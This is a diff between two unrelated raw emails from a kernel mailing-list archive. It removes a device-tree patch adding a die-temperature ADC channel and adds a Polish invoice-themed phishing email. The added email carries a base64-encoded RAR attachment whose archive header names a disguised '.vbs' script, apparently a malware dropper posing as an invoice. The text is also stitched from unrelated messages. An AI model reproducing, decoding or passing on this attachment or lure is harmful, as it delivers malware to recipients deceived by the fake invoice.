@@ -2,114 +2,96 @@ Return-Path: <SRS0=SFDS=MQ=vger.kernel.org=linux-kernel-owner@kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
 X-Spam-Level: 
-X-Spam-Status: No, score=-8.9 required=3.0 tests=DKIMWL_WL_HIGH,DKIM_SIGNED,
-	DKIM_VALID,DKIM_VALID_AU,HEADER_FROM_DIFFERENT_DOMAINS,INCLUDES_PATCH,
-	MAILING_LIST_MULTI,SIGNED_OFF_BY,SPF_PASS,URIBL_BLOCKED,USER_AGENT_GIT
-	autolearn=ham autolearn_force=no version=3.4.0
+X-Spam-Status: No, score=-0.8 required=3.0 tests=HEADER_FROM_DIFFERENT_DOMAINS,
+	MAILING_LIST_MULTI,SPF_PASS autolearn=ham autolearn_force=no version=3.4.0
 Received: from mail.kernel.org (mail.kernel.org [198.145.29.99])
-	by smtp.lore.kernel.org (Postfix) with ESMTP id 2E5C5C64EB8
-	for <linux-kernel@archiver.kernel.org>; Thu,  4 Oct 2018 00:14:58 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTP id 888CEC00449
+	for <linux-kernel@archiver.kernel.org>; Thu,  4 Oct 2018 00:20:02 +0000 (UTC)
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by mail.kernel.org (Postfix) with ESMTP id E98F82098A
-	for <linux-kernel@archiver.kernel.org>; Thu,  4 Oct 2018 00:14:57 +0000 (UTC)
-Authentication-Results: mail.kernel.org;
-	dkim=pass (1024-bit key) header.d=chromium.org header.i=@chromium.org header.b="CG40vsk2"
-DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org E98F82098A
-Authentication-Results: mail.kernel.org; dmarc=fail (p=none dis=none) header.from=chromium.org
+	by mail.kernel.org (Postfix) with ESMTP id ED4572098A
+	for <linux-kernel@archiver.kernel.org>; Thu,  4 Oct 2018 00:20:01 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org ED4572098A
+Authentication-Results: mail.kernel.org; dmarc=none (p=none dis=none) header.from=proj-jack.pl
 Authentication-Results: mail.kernel.org; spf=none smtp.mailfrom=linux-kernel-owner@vger.kernel.org
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1727380AbeJDHFd (ORCPT
+        id S1727190AbeJDHKl (ORCPT
         <rfc822;linux-kernel@archiver.kernel.org>);
-        Thu, 4 Oct 2018 03:05:33 -0400
-Received: from mail-pf1-f196.google.com ([209.85.210.196]:43853 "EHLO
-        mail-pf1-f196.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1727347AbeJDHFc (ORCPT
+        Thu, 4 Oct 2018 03:10:41 -0400
+Received: from shared-amb193.rev.nazwa.pl ([85.128.184.193]:19382 "EHLO
+        shared-amb193.rev.nazwa.pl" rhost-flags-OK-OK-OK-OK)
+        by vger.kernel.org with ESMTP id S1726270AbeJDHKk (ORCPT
         <rfc822;linux-kernel@vger.kernel.org>);
-        Thu, 4 Oct 2018 03:05:32 -0400
-Received: by mail-pf1-f196.google.com with SMTP id p24-v6so2439776pff.10
-        for <linux-kernel@vger.kernel.org>; Wed, 03 Oct 2018 17:14:52 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=chromium.org; s=google;
-        h=from:to:cc:subject:date:message-id:in-reply-to:references
-         :mime-version:content-transfer-encoding;
-        bh=yjCdwjVblOuE0rbT1WEw8RU8kvqJNXEgtd9ixVw2O8s=;
-        b=CG40vsk2jHN/5EW7l4QPN9k6bINw8c4I8NNFrbiDNAXdaJFE9fuNcT/WU3YlHOZ/b4
-         ipl4yrrTlBiSKXKCEUOKBOkckIEu0BwU6sqTOeTqU2uERJ8J5ST9msAatvuD+Al4brLb
-         Zjq9Run5INNRkLehPJ3g0cxVIpa0HesUbHoHE=
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:from:to:cc:subject:date:message-id:in-reply-to
-         :references:mime-version:content-transfer-encoding;
-        bh=yjCdwjVblOuE0rbT1WEw8RU8kvqJNXEgtd9ixVw2O8s=;
-        b=rQhOy3BSJX83LnUqk8qEPkO6EeZUv5fQh+FN7ycI+qvXnScGMteHn+RT36mgM4MW4q
-         uVr8foiF7eEHAAiufJrBkbjokQ8chy5yHoAaMH4V5dPHTQR4egPIQio37WQzAn6jpV5x
-         LqJeQKxOeJE3myqyrMbU98Vvagag6T5TAMnzpwo2Ncsy1CT805S/sV3aDFAjW0gNKoeY
-         89Tv5MukuM5IRmksOyPeMvcgms0p1Y19d/nqc9cD5QvovuOYL47uy7SY+KlRLWqJtJdS
-         DAsMKIApdpyOU3XDRqzHbfqn6n3wTTEncONeAsz4Xi+8wKrQylqLDsj8YgrnYH7e7Cg+
-         go1w==
-X-Gm-Message-State: ABuFfogOCRHPid3h0nJ77nTmg2pdn7pkxmKvLC2Wtv469QWS2iZepU8O
-        uX4M3UmOxZPK4dN32/mL59P4lQ==
-X-Google-Smtp-Source: ACcGV61QBotVraPgPIgkRYWRv1nu0MxtJ3WouaoppIHAvFb/pBQhzR6vNre4r5vOVSrx1Zx+dxSFUg==
-X-Received: by 2002:a62:5a83:: with SMTP id o125-v6mr4064370pfb.117.1538612092133;
-        Wed, 03 Oct 2018 17:14:52 -0700 (PDT)
-Received: from mka.mtv.corp.google.com ([2620:15c:202:1:b6af:f85:ed6c:ac6a])
-        by smtp.gmail.com with ESMTPSA id b81-v6sm6497051pfm.96.2018.10.03.17.14.51
-        (version=TLS1_2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128/128);
-        Wed, 03 Oct 2018 17:14:51 -0700 (PDT)
-From:   Matthias Kaehlcke <mka@chromium.org>
-To:     Andy Gross <andy.gross@linaro.org>,
-        David Brown <david.brown@linaro.org>,
-        Rob Herring <robh+dt@kernel.org>,
-        Mark Rutland <mark.rutland@arm.com>,
-        Jonathan Cameron <jic23@kernel.org>,
-        Hartmut Knaack <knaack.h@gmx.de>,
-        Lars-Peter Clausen <lars@metafoo.de>,
-        Peter Meerwald-Stadler <pmeerw@pmeerw.net>
-Cc:     linux-arm-msm@vger.kernel.org, linux-soc@vger.kernel.org,
-        devicetree@vger.kernel.org, linux-iio@vger.kernel.org,
-        linux-kernel@vger.kernel.org,
-        Douglas Anderson <dianders@chromium.org>,
-        Matthias Kaehlcke <mka@chromium.org>
-Subject: [PATCH v5 2/2] arm64: dts: qcom: pm8998: Add die temperature channel node to the ADC
-Date:   Wed,  3 Oct 2018 17:14:32 -0700
-Message-Id: <20181004001432.21218-3-mka@chromium.org>
-X-Mailer: git-send-email 2.19.0.605.g01d371f741-goog
-In-Reply-To: <20181004001432.21218-1-mka@chromium.org>
-References: <20181004001432.21218-1-mka@chromium.org>
+        Thu, 4 Oct 2018 03:10:40 -0400
+X-Greylist: delayed 429 seconds by postgrey-1.27 at vger.kernel.org; Thu, 04 Oct 2018 03:10:39 EDT
+X-Virus-Scanned: by amavisd-new using ClamAV (11)
+Received: from tttvveddseeeq (unknown [185.45.193.254])
+        by proj-jack.nazwa.pl (Postfix) with ESMTP id ECA1E426290
+        for <linux-kernel@vger.kernel.org>; Thu,  4 Oct 2018 02:12:48 +0200 (CEST)
+From:   "Piotr Jaworski" <jolanta.milewczyk@proj-jack.pl>
+Subject: =?utf-8?B?ZmFrdHVyxJkgbnJfMTAxOTY2MjQvMTAvMjAxOA==?=
+To:     "linux-kernel" <linux-kernel@vger.kernel.org>
+Content-Type: multipart/mixed; boundary="l5QUKyjn2wa8bj=_wHEbl93C0xsrSPgCnO"
 MIME-Version: 1.0
-Content-Transfer-Encoding: 8bit
+Reply-To: "Piotr Jaworski" <jolanta.milewczyk1@proj-jack.pl>
+Organization: Ageta Sp. z o.o.
+Date:   Thu, 4 Oct 2018 01:12:49 +0100
+Message-Id: <20181004001248.ECA1E426290@proj-jack.nazwa.pl>
 Sender: linux-kernel-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-Add a channel node for the die temperature to the ADC.
+This is a multi-part message in MIME format
 
-Signed-off-by: Matthias Kaehlcke <mka@chromium.org>
-Reviewed-by: Douglas Anderson <dianders@chromium.org>
----
-Changes in v4:
-- added unit address to 'die-temp' node
----
- arch/arm64/boot/dts/qcom/pm8998.dtsi | 5 +++++
- 1 file changed, 5 insertions(+)
+--l5QUKyjn2wa8bj=_wHEbl93C0xsrSPgCnO
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: inline
 
-diff --git a/arch/arm64/boot/dts/qcom/pm8998.dtsi b/arch/arm64/boot/dts/qcom/pm8998.dtsi
-index 048f19fa0150..32b141637d13 100644
---- a/arch/arm64/boot/dts/qcom/pm8998.dtsi
-+++ b/arch/arm64/boot/dts/qcom/pm8998.dtsi
-@@ -75,6 +75,11 @@
- 			#address-cells = <1>;
- 			#size-cells = <0>;
- 			#io-channel-cells = <1>;
-+
-+			die-temp@ADC5_DIE_TEMP {
-+				reg = <ADC5_DIE_TEMP>;
-+				label = "die_temp";
-+			};
- 		};
- 
- 		rtc@6000 {
--- 
-2.19.0.605.g01d371f741-goog
+Dzie=C5=84 dobry,
+
+W  za=C5=82=C4=85czniku  przesy=C5=82am  deklaracje  za  10/18.=20
+
+
+
+
+Z powa=C5=BCaniem,
+
+
+Piotr Jaworski
+
+Ageta Sp. z o.o.
+
+
+--l5QUKyjn2wa8bj=_wHEbl93C0xsrSPgCnO
+Content-Type: application/octet-stream;
+	name="Faktura n_181003_13.rar"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+	filename="Faktura n_181003_13.rar"
+
+UmFyIRoHAQDz4YLrCwEFBwAGAQGAgIAAdCJItDMCAwvrCASXGCAIhv8tgAMAF0Zha3R1cmEgbl8x
+ODEwMDNfMTMudmJzCgMC0Sr2EWdb1AHJ8GcEQGRDMjZPNQVe5nhSp9EpmhRDhkJNqpu05IE/m/wg
+Gt1s2t62DUgpGxuNMPwPe9YS8bJI2wcqeIIBiWLOC7WJY149mYs4Vl5wfZVpLoX1VdZ4g2h02GB5
+Cfyvf1LwQNaqpsLzjy/r6r54HEjD1vdIz1wjCQWaLMczpwdN/XsCyl2V+3t1r/r02Aw32oEBZbXa
+azNppRvnqyn9Ai79zowobe8UODyM+E+06S/oc98Ym4spdZLncS1ozf0kYxA6U3ON0GzZxHKUqIJC
+rycte5yXFaVK9nzZIQ15jGZzhSXxtMLghNJsrU6Skb5TtPPzQEaW6Rvm8TjmrhLd0Dg3w4Ub2JYC
+HAEt2CB6A39nTndAe7z6YSTC0BHDzqNZ5MMzRMokjNCtAL37WqZqhrADcrR4s2XqYtNaqdRXjDBs
+QWs/lf/lAQdFyzy2wfuLiefh6FTSQucJpb6+6WbRaW72oX22q3E7UW7kiduKuvFoPrbaXYBQ/RyJ
+U/6+NmsCPRe+jMlqRZJg5hagCfUvivhQEvkdaZtvFshKkEJHR8DFlVappX77pW5YnyRVZgvOAcLn
+7HnloAEPhGk7JEn25QGSby/fIssWKtevsLNkfivG979u1sLVuLB4JJOgimvCgCKHF4Xl9La++JqI
+x3InyxV3oeUoCqweGbRtIsdQFok5gx+Zw4LK30ZBmpe8Ya3+3+78Ms4RJNSayVsD5w+1exWordZK
+X7LDC+n9+PjSJ6ixKhf0njYbkVbI86nde47VmxZtF9JpvBWTJzHnP4CUGVQRWXSsLl3OX0MaYKpv
+BgC5D4FjDhzvmsV64b/+DPTDqxeQWm52malFrZzRO5Fbe33/R5wvgvbe8PavphNSUKtvr8/UNwEc
+B/WqL91L7WYPfEcMB6GtYbQOxHB6CNIsNmPfEVY3LCqKaysL41gqMos8kvypVJ1fKMCFO2VAEuZI
+5weirGzymTb6OdJRKXLWWrFLP2nxbgSWU2E01RjEpxy+GgkTK5XTWX7lBznifN/8xr3qZsylfWtU
+y19G07yAWLeBWfn2YpY57Na1Ws17laxY5t5UsRQF6DQDSdxELrSHBxCrJyIOAMdWeLeej29h5DQ0
+N6HEyJ87qv8ygTfnO+wPr4gbLWMCcbfx4foctEuxuEzoHupiGBaWhqGIn6MNYYEOogAbQ1iXmB0r
+T+jaqR0no6kvpmhjqGmxhXiLf4P511OZp06qilEB8OAfGA6YHmPGWBZ2nG4LUlOEP1Hr/Cw4Fb8D
+w497YpQQmS13SfJnIqgzxkiZ6Slucuk2WRRSbm0wo3b2+Jlp1Q6zXrh0M5RydkJAJPeOFuh4Exhd
+u+G4/u37o5W/BgpPIZIowIH3R+pTgvaSmGnsKncfSE5eBqPNxkHa8kc3014Op0ELrE7mQ5g7O979
+VTaMfcIV5R44wnvxP2+p/SIdLWPVeBiOxtLpGlK95rThyfR0x/DKhw8vbP/A7GvCpic1cWkyeoet
+rf6kwXCqBzg/3L+iD4Add1ZRAwUEAA==
+
+--l5QUKyjn2wa8bj=_wHEbl93C0xsrSPgCnO--
 
